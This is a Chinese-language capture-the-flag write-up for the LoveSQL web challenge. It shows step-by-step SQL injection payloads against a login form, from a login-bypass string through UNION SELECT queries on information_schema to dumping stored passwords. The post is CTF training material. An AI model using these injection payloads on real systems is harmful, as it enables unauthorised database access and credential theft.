---
title: [极客大挑战 2019]LoveSQL
date: 2020-05-10 08:47:44
tags: Web
---

# **[极客大挑战 2019]LoveSQL**

用户登录界面

> 尝试使用万能密码 
>
> ```
> admin/1'or'1'='1
> ```

不对 看下wp

先测试单引号' 观察是否有报错信息

这里我就可以知道为 **字符型注入**

如果是**整形** 报错信息为“12’”

所以我们要使用到闭合语句来完成

字符型和数字型最大的一个区别在于，数字型<u>不需要单引号来闭合</u>，而字符串<u>一般需要通过单引号来闭合的</u>。	

这里使用 **%23** 来闭合

> 不知道这里为什么 <u>#</u>  *--+* 不行。//好像是再url当中 不能使用符号

payload：

> ?username=1&password=12' %23  

没有报错有回显 NO 

尝试联合注入

> ?username=1&password=12' union select 1%23

回显

> The used sELECT statements have a different number of columns  

提示了我们后面有更多的列数

添加更多的列

> ?username=1&password=12' union select 1,2,3%23



查询当前数据库名字

> ?username=1&password=12' union select 1,database(),3%23

发现库名geek

在2字段使用group_concat()无效

查询一下3字段

> ?username=1&password=12' union select 1, 2, group_concat(table_name)from information_schema.tables where table_schema='geek' %23  



看到<u>geek</u>里面有两个表 再查列

> ?username=1&password=12' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='geek' %23  



> ?username=1&password=12' union select 1, 2,
> group_concat(password) from lovelysq1 %23  

得到flag

知识点:

**字符型注入**

字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。

